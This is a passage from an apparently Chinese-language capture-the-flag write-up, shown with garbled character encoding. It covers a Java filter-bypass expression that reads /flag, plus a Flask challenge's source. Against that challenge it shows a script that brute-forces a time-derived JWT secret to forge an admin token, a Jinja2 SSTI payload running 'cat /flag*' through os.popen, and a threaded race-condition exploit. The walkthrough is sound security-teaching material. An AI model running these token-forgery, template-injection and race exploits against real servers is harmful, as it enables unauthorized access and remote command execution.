class="line">navigator</span><br><span class="line">this</span><br><span class="line">global</span><br><span class="line">self</span><br><span class="line">top</span><br><span class="line">.</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">[</span><br><span class="line">]</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">`</span><br><span class="line">$</span><br><span class="line">&amp;</span><br><span class="line">*</span><br><span class="line">+</span><br><span class="line">-</span><br><span class="line">/</span><br><span class="line">\</span><br><span class="line">|</span><br></pre></td></tr></table></figure><img src="b443d4edd524037863cedc037136a3d7.png" alt="5f3f2d03-cc30-493f-92f9-b96035b4376c.png"  /><br/><p>æ¸¬è©¦JavaScriptå…¨å±€å°è±¡:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ””æˆª: `Runtime`, `ProcessBuilder`, `exec()`, `start()`, åå°„æ–¹æ³•</span><br></pre></td></tr></table></figure><img src="536992c6825492585c80fbcd8a7a065f.png" alt="743079df-5d15-4ad7-b75d-9ca415a0485a.png"  /><img src="487e9930d841914ed2554b0675d66b3f.png" alt="22957f1d-7cec-4476-9336-83d325f0c36a.png"  /><h3 id="ç”¨å­—ç¬¦ä¸²æ‹¼æ¥"><a href="#ç”¨å­—ç¬¦ä¸²æ‹¼æ¥" class="headerlink" title="ç”¨å­—ç¬¦ä¸²æ‹¼æ¥"></a>ç”¨å­—ç¬¦ä¸²æ‹¼æ¥</h3><p>eval æ˜¯ 200 : val(â€˜javâ€™ + â€˜a.lang.Runtâ€™ + â€˜ime.getRuntâ€™ + â€˜ime().exec(â€œlsâ€)â€™)</p><img src="5d11b655aa8f4c96bbede02896bc7e47.png" alt="ddcf7a8e-108a-459c-add3-87bca89e8c7b.png"  /><p>é»è™Ÿçµ„åˆå¥½åƒæ˜¯æ²’æœ‰å•é¡Œçš„</p><p>java . lang</p><p>ä½¿ç”¨Javaçš„Files.readAllLines()æ–¹æ³•æˆåŠŸè®€å–äº†flagæ–‡ä»¶:</p><p>Filesé¡çš„ç‰¹æ®Šæ€§:</p><ul><li><code>java.nio.file.Files</code> æ˜¯Java 7å¼•å…¥çš„æ–°API</li><li>ä¸»è¦ç”¨æ–¼æ–‡ä»¶æ“ä½œï¼Œä¸æ˜¯å…¸å‹çš„å‘½ä»¤åŸ·è¡Œé¡</li><li>æ–¹æ³•å <code>readAllLines</code> çœ‹èµ·ä¾†åƒæ˜¯å®‰å…¨çš„æ–‡ä»¶è®€å–æ“ä½œ</li></ul><p>java.nio.file.Files.readAllLines(java.nio.file.Paths.get(â€˜&#x2F;flagâ€™)).get(0)</p><h2 id="åºŸå¼ƒçš„ç½‘ç«™"><a href="#åºŸå¼ƒçš„ç½‘ç«™" class="headerlink" title="åºŸå¼ƒçš„ç½‘ç«™"></a>åºŸå¼ƒçš„ç½‘ç«™</h2><p>å…ˆçœ‹çœ‹æ¡ä»¶ç«äº‰é€™å€‹æ¦‚å¿µï¼š</p><p><a href="https://zhuanlan.zhihu.com/p/403063546#:~:text=%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%EF%BC%88Race%20condition,%E8%84%8F%E7%89%9B%EF%BC%88dirty%20cow%EF%BC%89%E3%80%82">https://zhuanlan.zhihu.com/p/403063546#:~:text&#x3D;%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%EF%BC%88Race%20condition,%E8%84%8F%E7%89%9B%EF%BC%88dirty%20cow%EF%BC%89%E3%80%82</a></p><p>çœ‹çœ‹app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, abort, redirect, render_template_string</span><br><span class="line"><span class="keyword">import</span> jwt, hashlib, time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">time_started = <span class="built_in">round</span>(time.time())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;System started at <span class="subst">&#123;time_started&#125;</span>&quot;</span>)</span><br><span class="line">APP_SECRET = hashlib.sha256(<span class="built_in">str</span>(time_started).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">tempuser = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">USER_DB = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Administrator&quot;</span>&#125;,</span><br><span class="line">    <span class="string">&quot;guest&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: <span class="number">2</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;guest&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Guest User&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_required</span>(<span class="params">f</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        cookie = request.cookies.get(<span class="string">&#x27;session&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> cookie <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            </span><br><span class="line">            response = redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">            session = jwt.encode(USER_DB[<span class="string">&#x27;guest&#x27;</span>], APP_SECRET, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">            response.set_cookie(<span class="string">&#x27;session&#x27;</span>, session)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            user_data = jwt.decode(cookie, APP_SECRET, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> user_data[<span class="string">&#x27;role&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&quot;Admin access required.&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> user_data[<span class="string">&#x27;name&#x27;</span>] != <span class="string">&#x27;Administrator&#x27;</span>:</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&quot;Admin access required.&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">0.15</span>)</span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            abort(<span class="number">401</span>, description = <span class="string">f&quot;Session expired. Please log in again. System has been running <span class="subst">&#123;<span class="built_in">round</span>(time.time() - time_started)&#125;</span> seconds.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> f(*args, **kwargs)</span><br><span class="line">    wrapper.__name__ = f.__name__</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_user</span>():</span><br><span class="line">    <span class="keyword">if</span> request.endpoint == <span class="string">&#x27;static&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">global</span> tempuser</span><br><span class="line">    cookie = request.cookies.get(<span class="string">&#x27;session&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> cookie <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        tempuser = USER_DB[<span class="string">&#x27;guest&#x27;</span>]</span><br><span class="line">        session = jwt.encode(tempuser, APP_SECRET, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        response = redirect(request.path)</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;session&#x27;</span>, session)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user_data = jwt.decode(cookie, APP_SECRET, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">        tempuser = user_data</span><br><span class="line">    <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">        session = jwt.encode(USER_DB[<span class="string">&#x27;guest&#x27;</span>], APP_SECRET, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        content = render_template_string(</span><br><span class="line">            <span class="string">&quot;Session expired. Please log in again. System has been running %d seconds.&quot;</span> %</span><br><span class="line">            (<span class="built_in">round</span>(time.time() - time_started))</span><br><span class="line">        )</span><br><span class="line">        response = app.make_response((content, <span class="number">401</span>))</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;session&#x27;</span>, session)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@admin_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_panel</span>():</span><br><span class="line">    <span class="keyword">global</span> tempuser</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;Welcome Back, %s&quot;</span> % tempuser[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/static/&lt;path:filename&gt;&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve_static</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename.endswith(<span class="string">&#x27;.png&#x27;</span>):</span><br><span class="line">        abort(<span class="number">403</span>, description=<span class="string">&quot;Only .png files are allowed.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><img src="ccf578be4c0edd777dfbbb949ee6f75e.png" alt="d937c042-f0a4-4d35-87e8-808004609d98.png"  /><p>å¯ä»¥çœ‹è¦‹é€™å…©ç”¨æˆ¶çš„DB</p><img src="2a1dc72ff37a75ee125f066b41d359ff.png" alt="2e5932f7-74b9-4686-821a-03330f9f1f58.png"  /><p>é€™å€‹æ˜¯ä¸€é–‹å§‹æ‰“é–‹ç¶²ç«™æ™‚æœƒç™¼å‡ºä¾†çš„</p><p>æˆ‘å€‘å¯ä»¥åœ¨cookieä¸‹æ‰¾åˆ°guestçš„token</p><p>tokençš„çµæ§‹æ˜¯jwt , æˆ‘å€‘å¯ä»¥åœ¨jwt.ioçœ‹çœ‹:</p><p><a href="https://www.jwt.io/">https://www.jwt.io/</a></p><img src="ca45965f60d37209db106933797ee6c9.png" alt="a3486944-b81b-4c32-9c25-f84d65bf795c.png"  /><p>ä¸Šé¢æ˜¯åŠ å¯†æ–¹å¼,ä¸­é–“æ˜¯èº«ä»½ä¿¡æ¯,å¾Œé¢æ˜¯secret , æˆ‘ç¾åœ¨è¦æ‰¾åˆ°secretå¹¶å½é€ adminçš„token</p><p>ä»¥ä¸‹æ˜¯pythonè…³æœ¬:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½ çš„ç½‘ç«™</span></span><br><span class="line">url = <span class="string">&quot;http://8.147.132.32:24750/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¼šè¯</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.verify = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨å¯»æ‰¾ç½‘ç«™å¯†é’¥...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. è·å–è¿è¡Œæ—¶é—´</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = session.get(url + <span class="string">&#x27;/admin&#x27;</span>, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;invalid&#x27;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–é”™è¯¯ä¿¡æ¯...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;System has been running&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">import</span> re</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;System has been running (\d+) seconds&#x27;</span>, r.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            uptime = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;ç½‘ç«™è¿è¡Œäº†: <span class="subst">&#123;uptime&#125;</span> ç§’&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 2. è®¡ç®—å¯åŠ¨æ—¶é—´</span></span><br><span class="line">            current_time = <span class="built_in">int</span>(time.time())</span><br><span class="line">            time_started = current_time - uptime</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;ç½‘ç«™å¯åŠ¨æ—¶é—´å¤§çº¦æ˜¯: <span class="subst">&#123;time_started&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 3. åœ¨é™„è¿‘æ‰¾æ­£ç¡®çš„å¯†é’¥</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨å°è¯•å¯èƒ½çš„å¯†é’¥...&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> ts <span class="keyword">in</span> <span class="built_in">range</span>(time_started - <span class="number">300</span>, time_started + <span class="number">300</span>):</span><br><span class="line">                secret = hashlib.sha256(<span class="built_in">str</span>(ts).encode()).hexdigest()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># æµ‹è¯•è¿™ä¸ªå¯†é’¥æ˜¯å¦æ­£ç¡®  </span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># ç”¨å·²çŸ¥çš„guest tokenæµ‹è¯•</span></span><br><span class="line">                    guest_token = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Miwicm9sZSI6Imd1ZXN0IiwibmFtZSI6Ikd1ZXN0IFVzZXIifQ.C7nbrf18MKTAzyZRtBdgid4DO2ug6W8ApHIfR8tCbAE&quot;</span></span><br><span class="line">                    decoded = jwt.decode(guest_token, secret, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># å¦‚æœæˆåŠŸè§£ç ï¼Œå°±æ‰¾åˆ°äº†ï¼</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;æ‰¾åˆ°å¯†é’¥äº†!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;å¯åŠ¨æ—¶é—´æˆ³: <span class="subst">&#123;ts&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;å¯†é’¥: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 4. ç”¨è¿™ä¸ªå¯†é’¥é€ ç®¡ç†å‘˜token</span></span><br><span class="line">                    admin_data = &#123;</span><br><span class="line">                        <span class="string">&quot;id&quot;</span>: <span class="number">1</span>,</span><br><span class="line">                        <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>, </span><br><span class="line">                        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Administrator&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    admin_token = jwt.encode(admin_data, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;ğŸªª ç®¡ç†å‘˜Token: <span class="subst">&#123;admin_token&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># æµ‹è¯•èƒ½ä¸èƒ½è¿›ç®¡ç†å‘˜é¡µé¢</span></span><br><span class="line">                    r = session.get(url + <span class="string">&#x27;/admin&#x27;</span>, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: admin_token&#125;)</span><br><span class="line">                    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;æˆåŠŸè¿›å…¥ç®¡ç†å‘˜é¡µé¢!&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;ç°åœ¨å¯ä»¥ç”¨è¿™ä¸ªå¯†é’¥åšSSTIæ”»å‡»äº†&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="comment"># å¯†é’¥ä¸å¯¹ï¼Œç»§ç»­è¯•</span></span><br><span class="line">                    <span class="keyword">if</span> ts % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;å°è¯•ä¸­... <span class="subst">&#123;ts&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ²¡æœ‰æ‰¾åˆ°è¿è¡Œæ—¶é—´ä¿¡æ¯&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><img src="ea07cdc17824f19a5c00f5c3c65e6596.png" alt="2e448acc-862a-491a-8c57-2789d6c94b14.png"  /><p>æœ€å¾Œæ‰¾åˆ°äº† , ä½†æ˜¯åœ¨&#x2F;adminæ²’æœ‰æ‰¾åˆ°flag , &#x2F;admin&#x2F;éƒ½æ²’æœ‰ , é€™è£¹è¦åœ¨&#x2F;adminçš„Welcome Back, {???} é€²è¡Œsstiæ³¨å…¥ , cat &#x2F;flag* , ä»¥ä¸‹ç‚ºsstiçš„å‘½ä»¤:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.application.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag*&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åªæ˜¯é€™æ¨£æ˜¯ä¸å¯ä»¥æ‹¿åˆ°flagçš„, æˆ‘è¦é€šè¿‡å¤§é‡guestè¯·æ±‚ä¿®æ”¹äº†å…¨å±€çš„tempuserå˜é‡ , å°†æ¶æ„SSTI payloadæ³¨å…¥åˆ°tempuser[â€˜nameâ€™]å­—æ®µ , åœ¨adminæ£€æŸ¥é€šè¿‡åã€å®é™…æ¸²æŸ“å‰ , æˆåŠŸå°†tempuseræ›¿æ¢ä¸ºåŒ…å«SSTI payloadçš„guestç”¨æˆ·æ•°æ®</p><p>ç·šç¨‹1: Guestè«‹æ±‚æ´ªæ°´æ”»æ“Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flood_guest</span>():</span><br><span class="line">    <span class="keyword">nonlocal</span> success</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: malicious_token&#125;, timeout=<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ç·šç¨‹2: Adminè«‹æ±‚å˜—è©¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">try_admin</span>():</span><br><span class="line">    <span class="keyword">nonlocal</span> success</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + <span class="string">&#x27;/admin&#x27;</span>, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: admin_token&#125;, timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># æª¢æŸ¥éŸ¿æ‡‰ä¸­æ˜¯å¦åŒ…å«flag</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[SUCCESS] æ‰¾åˆ°flag: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">                success = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ç„¶å¾Œ:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">t1 = threading.Thread(target=flood_guest)</span><br><span class="line">t2 = threading.Thread(target=try_admin)</span><br><span class="line"></span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line"></span><br><span class="line">t2.join()</span><br><span class="line">t1.join()</span><br></pre></td></tr></table></figure><p>æœ€å¾Œè…³æœ¬å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8.147.132.32:24750/&quot;</span></span><br><span class="line">secret = <span class="string">&quot;812f7d41b298c20d8cb041daaa8c142b181838821de5647ad29fa4ef79c084f7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">precise_race_attack</span>():</span><br><span class="line">    <span class="keyword">import</span> jwt</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åˆ›å»ºæ¶æ„guest token</span></span><br><span class="line">    malicious_guest = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="string">&quot;role&quot;</span>: <span class="string">&quot;guest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag*&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    malicious_token = jwt.encode(malicious_guest, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    admin_token = <span 